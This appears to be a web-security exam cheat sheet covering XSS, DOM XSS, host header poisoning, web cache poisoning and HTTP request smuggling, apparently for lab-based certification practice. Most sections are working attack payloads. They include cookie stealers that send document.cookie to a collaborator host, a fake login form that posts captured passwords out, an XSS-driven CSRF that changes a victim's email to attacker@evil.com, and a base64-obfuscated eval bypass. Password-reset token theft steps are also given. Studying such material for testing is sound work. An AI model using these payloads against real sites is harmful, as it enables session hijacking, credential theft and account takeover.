# Stage 1: Get Access to Any User

## Overview
Stage 1 focuses on obtaining access to any user account. Common attack vectors include XSS, authentication bypasses, and cache poisoning.

## Common Vulnerability Locations

### 🔍 Search Input
- Reflected XSS
- DOM-based XSS
- Always scan with Burp Scanner

### 💬 Comment Section
- Stored XSS
- DOM-based XSS
- **Note:** Comment section might be disabled on exam

### 🔐 Password Reset
- Host header poisoning
- Password reset logic flaws
- Email parameter manipulation

### 📧 Feedback Forms
- XSS in email/message fields
- HTTP request smuggling

## Vulnerability Checklist

- [ ] XSS in search functionality
- [ ] XSS in comment sections
- [ ] DOM-based XSS vulnerabilities
- [ ] Host header attacks on password reset
- [ ] Web cache poisoning
- [ ] HTTP request smuggling
- [ ] Authentication bypass techniques

## Key Tools

- **Burp Scanner** - Target scan on search and comment inputs
- **Burp Collaborator** - For out-of-band XSS
- **DOM Invader** - For DOM-based vulnerabilities

## Quick Tips

1. **Always scan search and comment inputs first**
2. **Use Burp Collaborator for cookie stealing**
3. **Check password reset functionality for host header injection**
4. **Look for cache poisoning opportunities**
5. **Test for HTTP request smuggling on feedback forms**

---

# XSS (Cross-Site Scripting)

## 🎯 Target Locations

### Primary Targets
1. **Search Input** ⭐⭐⭐
   - Most common XSS location
   - Always run Burp Scanner
   
2. **Comment Section** ⭐⭐
   - Stored XSS opportunity
   - May be disabled on exam

## 🔥 Essential Payloads

### 1. Basic Cookie Stealer
```html
<script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
```

### 2. Image-based Cookie Stealer
```html
<script>document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</script>
```

### 3. Fetch-based Exfiltration
```javascript
<script>fetch('http://burp.oastify.com?c='+btoa(document.cookie))</script>
```

## 📚 Lab-Specific Payloads

### DOM XSS in document.write (Select Element)
**Context:** `storeId` parameter in product page

**Basic Payload:**
```javascript
storeId=kek"></select><script>alert(1)</script>
```

**Cookie Stealer:**
```javascript
"></select><script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
```

---

### AngularJS Expression XSS
**Context:** Angle brackets and quotes are HTML-encoded

**Basic Payload:**
```javascript
{{constructor.constructor('alert(1)')()}}
```

**Cookie Stealer:**
```javascript
{{constructor.constructor('document.location="http://burp.oastify.com?c="+document.cookie')()}}
```

---




### Reflected DOM XSS
**Context:** Escaping from JavaScript string

**Basic Payload:**
```javascript
\\"-alert()}//
```

**Cookie Stealer:**
```javascript
\\"-fetch('http://burp.oastify.com?c='+btoa(document.cookie))}//
```

---

### Stored DOM XSS (First Angle Bracket Bypass)
**Context:** Function replaces first angle brackets only

**Basic Payload:**
```html
<><img src=1 onerror=alert(1)>
```

**Cookie Stealer:**
```html
<><img src=1 onerror="window.location='http://burp.oastify.com/c='+document.cookie">
```

---

### Password Capture via XSS
**Context:** Create fake login form to capture credentials

**Basic Form:**
```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('http://burp.oastify.com',{
  method:'POST',
  mode: 'no-cors',
  body:username.value+':'+this.value
});">
```

**With Autocomplete:**
```html
<input name="username" id="username" autocomplete="username">
<input type="password" id="password" name="password" autocomplete="password" 
  onchange="if(this.value.length)fetch('http://burp.oastify.com',{
    method:'POST',
    mode: 'no-cors',
    body:username.value+':'+this.value
  });">
```

---

### XSS to Perform CSRF
**Context:** Steal CSRF token and perform action

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();

function handleResponse() {
  var token = this.responseText.match(/name=\"csrf\" value=\"(\w+)\"/)[1];
  var changeReq = new XMLHttpRequest();
  changeReq.open('post', '/my-account/change-email', true);
  changeReq.send('csrf='+token+'&email=attacker@evil.com');
}
</script>
```

## 🛡️ Bypass Techniques

### Case Variation
```html
</ScRiPt ><ScRiPt >document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</ScRiPt >
```

### String.fromCharCode Encoding
```javascript
</ScRiPt ><ScRiPt >document.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,34,104,116,116,112,58,47,47) + document.cookie + String.fromCharCode(34,32,47,62));</ScRiPt >
```

### Bracket Notation Bypass
```javascript
"-alert(window["document"]["cookie"])-"
"-window["alert"](window["document"]["cookie"])-"
"-self["alert"](self["document"]["cookie"])-"
```

### Base64 Eval Bypass
```javascript
"+eval(atob("ZmV0Y2goImh0dHBzOi8vYnVycC5vYXN0aWZ5LmNvbS8/Yz0iK2J0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//
```
*Decodes to:* `fetch("https://burp.oastify.com/?c="+btoa(document['cookie']))`

## 🎓 Exam Tips

1. **Always use Burp Collaborator** - Replace `burp.oastify.com` with your collaborator URL
2. **Target Scan first** - Let Burp Scanner find the XSS context
3. **Adapt payloads** - Modify based on the filtering/encoding you encounter
4. **Check both search and comments** - But comments might be disabled
5. **Use exploit server** - Deliver payload to victim via exploit server

---

# DOM-based XSS

## 🎯 Overview

DOM-based XSS occurs when JavaScript code processes user input and writes it to the DOM in an unsafe way.

## 🔍 Detection

### Common Sinks
- `document.write()`
- `innerHTML`
- `outerHTML`
- `eval()`
- `setTimeout()`
- `setInterval()`

### Common Sources
- `location.search`
- `location.hash`
- `document.referrer`
- `document.cookie`
- `postMessage()`

## 🔥 Key Payloads

### 1. document.write with location.search
**Context:** Product page with `storeId` parameter

```javascript
?storeId="></select><script>alert(1)</script>
```

### 2. AngularJS Expression Injection
```javascript
{{constructor.constructor('alert(1)')()}}
```

### 3. Reflected DOM XSS
```javascript
\\"-alert()}//
```

### 4. Stored DOM XSS
```html
<><img src=1 onerror=alert(1)>
```

### 5. Web Messages XSS
```html
<iframe src="https://vulnerable-site.com/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

### 6. DOM-based Open Redirection
```javascript
?url=javascript:alert(1)
```

## 🎓 Exam Tips

1. **Use DOM Invader** - Burp's DOM Invader extension helps identify DOM XSS
2. **Check JavaScript files** - Look for unsafe DOM manipulation
3. **Test all URL parameters** - Including hash fragments
4. **Look for postMessage** - Web messaging is a common exam topic

---

# HTTP Host Header Attacks

## 🎯 Target Location

**Primary Target:** Password Reset Functionality (`Forgot password?`)

## 🔥 Attack Flow

### Step 1: Identify Password Reset
Look for "Forgot password?" functionality

### Step 2: Intercept Reset Request
```http
POST /forgot-password HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded

username=victim
```

### Step 3: Poison Host Header
```http
POST /forgot-password HTTP/1.1
Host: exploit-server.com
Content-Type: application/x-www-form-urlencoded

username=victim
```

### Step 4: Check Exploit Server Logs
The victim will receive an email with a link containing the token.

### Step 5: Use Token
```http
GET /forgot-password?token=abc123xyz HTTP/1.1
Host: vulnerable-site.com
```

## 🛡️ Alternative Headers

If `Host` header doesn't work, try these:

```http
X-Forwarded-Host: exploit-server.com
X-Host: exploit-server.com
X-Forwarded-Server: exploit-server.com
```

## 🎓 Exam Tips

1. **Always test password reset first** - Most common location
2. **Try all header variations** - `X-Forwarded-Host`, `X-Host`, etc.
3. **Check exploit server logs** - Tokens will appear there
4. **Test for localhost bypass** - Try `Host: localhost` for admin panels

---

# Web Cache Poisoning

## 🎯 Identification

### Key Indicators
1. **File:** `/resources/js/tracking.js` exists
2. **Header:** `X-Cache: hit` in response

**If you see BOTH** → Web cache poisoning is likely possible!

## 🔥 Exploitation

### Basic Attack Flow

#### 1. Find Unkeyed Input
Test headers that might not be part of cache key:
```http
GET / HTTP/1.1
Host: vulnerable-site.com
X-Forwarded-Host: exploit-server.com
```

#### 2. Check Response
Look for your input reflected:
```html
<script src="//exploit-server.com/resources/js/tracking.js"></script>
```

#### 3. Set Up Exploit Server
**File:** `/resources/js/tracking.js`

**Body:**
```javascript
document.location='http://burp.oastify.com/?c='+document.cookie
```

#### 4. Poison the Cache
**IMPORTANT:** Send the poisoned request **multiple times** (10+ times) until cache is poisoned.

```http
GET / HTTP/1.1
Host: vulnerable-site.com
X-Forwarded-Host: exploit-server.com
```

## 🎓 Exam Tips

1. **Look for tracking.js + X-Cache: hit** - Both must be present
2. **Send poisoned request 10+ times** - Cache needs multiple hits
3. **Use Param Miner** - Finds hidden unkeyed inputs
4. **Test common headers first:** `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Scheme`

---

# HTTP Request Smuggling

## 🎯 Overview

HTTP Request Smuggling exploits discrepancies in how front-end and back-end servers parse HTTP requests.

## 🔍 Types

### CL.TE (Content-Length → Transfer-Encoding)
- Front-end uses `Content-Length`
- Back-end uses `Transfer-Encoding`

### TE.CL (Transfer-Encoding → Content-Length)
- Front-end uses `Transfer-Encoding`
- Back-end uses `Content-Length`

## 🔥 Detection Payloads

### CL.TE Detection
```http
POST / HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
X: X
```

### TE.CL Detection
```http
POST / HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

## 🛠️ Tools

### HTTP Request Smuggler (Burp Extension)
**Essential tool for detecting and exploiting request smuggling**

**Usage:**
1. Install from BApp Store
2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
3. Review results for CL.TE, TE.CL, or TE.TE vulnerabilities

## 🎓 Exam Tips

1. **Use HTTP Request Smuggler extension** - Automates detection
2. **Check feedback forms** - Common location for smuggling
3. **Try GPOST method** - Easy detection technique
4. **Be patient** - Smuggling requires precise timing


**Q: Why doesn't `<><script>alert(1)</script>` work?**

**A:** Because:
1. The payload is inserted via `innerHTML`
2. Browsers **never execute** `<script>` tags inserted via `innerHTML`
3. This is by design (security feature in HTML5 spec)
4. You must use **event handlers** instead
5. `<><img src=x onerror=alert(1)>` works because `onerror` executes

**Exam rule:**
- innerHTML sink → Use event handlers (`onerror`, `onload`, etc.)
- document.write sink → Script tags work
- **Never waste time trying `<script>` in innerHTML contexts**
